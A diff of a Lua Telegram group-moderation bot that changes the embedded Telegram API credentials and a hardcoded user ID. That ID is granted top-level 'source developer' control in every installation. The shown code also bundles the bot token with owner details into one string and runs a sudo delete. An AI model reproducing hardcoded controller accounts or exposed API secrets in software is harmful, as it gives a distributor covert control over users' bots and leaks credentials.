@@ -95,7 +95,7 @@ Token = Information.Token
 UserBot = Information.UserBot
 Revor = Token:match("(%d+)")
 os.execute('sudo rm -fr .CallBack-Bot/'..Revor)
-LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=Revor,token=Token}
+LuaTele = luatele.set_config{api_id=9671629,api_hash='be5c84e9dc1ca0e2b53d54b71e575124',session_name=Revor,token=Token}
 LUATELE = URL.escape(""..Revor.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
 function var(value)  
 print(serpent.block(value, {comment=false}))   
@@ -115,7 +115,7 @@ return Chat_Type
 end
 function The_ControllerAll(UserId)
 ControllerAll = false
-local ListSudos ={Sudo_Id,1427981991}  
+local ListSudos ={Sudo_Id,7291869416}  
 for k, v in pairs(ListSudos) do
 if tonumber(UserId) == tonumber(v) then
 ControllerAll = true
@@ -136,7 +136,7 @@ Managers = Redis:sismember(Revor.."Revor:Managers:Group"..ChatId,UserId)
 Addictive = Redis:sismember(Revor.."Revor:Addictive:Group"..ChatId,UserId)
 Distinguished = Redis:sismember(Revor.."Revor:Distinguished:Group"..ChatId,UserId)
 StatusMember = LuaTele.getChatMember(ChatId,UserId).status.luatele
-if UserId == 1427981991 then
+if UserId == 7291869416 then
 Status = 'مبرمج السورس'
 elseif UserId == Sudo_Id then  
 Status = 'المطور الاساسي'
@@ -884,13 +884,13 @@ return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id}),LuaTele.setChatMemberSt
 elseif Statusrestricted(msg.chat_id,msg.sender.user_id).SilentGroup == true then
 return LuaTele.deleteMessages(msg.chat_id,{[1]= msg.id})
 end
-if tonumber(msg.sender.user_id) == 1427981991 then
+if tonumber(msg.sender.user_id) == 7291869416 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 1427981991 then
+elseif tonumber(msg.sender.user_id) == 7291869416 then
 msg.Name_Controller = 'مطور السورس '
 msg.The_Controller = 1
-elseif tonumber(msg.sender.user_id) == 1427981991 then
+elseif tonumber(msg.sender.user_id) == 7291869416 then
 msg.Name_Controller = 'مبرمج السورس '
 msg.The_Controller = 1
 elseif The_ControllerAll(msg.sender.user_id) == true then  
